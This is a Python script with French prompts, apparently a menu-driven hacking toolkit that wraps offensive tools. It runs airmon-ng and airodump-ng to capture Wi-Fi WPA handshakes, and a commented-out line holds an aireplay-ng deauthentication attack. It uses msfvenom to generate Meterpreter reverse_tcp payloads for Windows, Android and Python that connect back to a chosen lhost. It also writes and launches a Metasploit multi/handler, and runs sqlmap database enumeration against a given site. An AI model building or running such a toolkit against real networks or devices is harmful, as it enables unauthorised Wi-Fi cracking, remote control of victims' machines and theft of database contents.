import os
import time


class instruction:

    def __init__(self, message, bssid):
        self.message = message
        self.dan = "0"
        self.bssid = "0"

    def fonction_principal(self):
        print(self.message[0])
        print(self.message[1])
        print(self.message[2])
        print(self.message[3])

    def condition(self):
        self.dan = str(input("Quel nombre: "))
        if self.dan == "0":
            print("")
        elif self.dan == "1":
            print("Entrer le nom de votre interface : ")
            interface = input()
            os.system("sudo airmon-ng start "  + interface)
            print("des que vous voyez votre reseau appuyer sur ctrl c ")
            time.sleep(2)
            os.system("sudo airodump-ng wlan0mon")
            self.bssid = input("entre le bssid : ")
            channel = input("Entrer le channel : ")
            print("Retenez un client faites :")
            time.sleep(2)
            os.system("sudo airodump-ng -c " + channel + " --bssid " + self.bssid + " wlan0mon ")
            time.sleep(2)
            os.system("sudo airodump-ng -c " + channel + " --bssid " + self.bssid + " -w outpout wlan0mon &")

            os.system("xterm -hold -e  'python3 air.py' ")

            # os.system("sudo nohup airodump-ng -c " + channel + " --bssid " + bssid + " -w outpout wlan0mon &")
            # station = input("Entrer la station : ")
            # os.system("xterm  -e 'sudo aireplay-ng -0 15 -a " + bssid + " -c " + station + " wlan0mon' ")
            print("Le handshake a ete capturee pour le cracker utiliser la commande ")



        elif self.dan == "2":
            print("1 : windows ")
            print("2 : android ")
            print("3 : python ")
            pay = input("Quel system : ")
            if pay == "1":
                lhost = input("Entre le lhost : ")
                lport = input("Entrer le lport : ")
                os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > dan.exe")
            elif pay == "2":
                lhost = input("Entre le lhost : ")
                lport = input("Entrer le lport : ")
                os.system("msfvenom -p android/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > dan.apk")
            elif pay == "3":
                lhost = input("Entre le lhost : ")
                lport = input("Entrer le lport : ")
                os.system("msfvenom -p python/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > dan.py")


        elif self.dan == "3":
            lhost = input("Entre le lhost : ")
            lport = input("Entrer le lport : ")

            print("1 : windows ")
            print("2 : android ")
            print("3 : python ")
            file = open("msf.txt", "w+")
            file.write("use exploit/multi/handler\n")
            file.write("set lhost " + lhost + "\n")
            file.write("set lport " + lport + "\n")
            pay = input("Quel system : ")
            if pay == "1":
                file.write("set payload windows/meterpreter/reverse_tcp" + "\n")
            elif pay == "2":
                file.write("set payload android/meterpreter/reverse_tcp" + "\n")
            elif pay == "3":
                file.write("set payload python/meterpreter/reverse_tcp" + "\n")

            file.write("run" + "\n")
            file.close()
            os.system("msfconsole -r msf.txt")

        elif self.dan == "4":
            site = input("quel est le nom du site ? : ")
            os.system("sqlmap -u " + site + " --dbs")


        else:
            print("erreur veuliiez ressayer")
            os.system("echo pas repertorie")

    def get_dan(self):
        return self.dan
    def get_bssid(self):
        return self.bssid
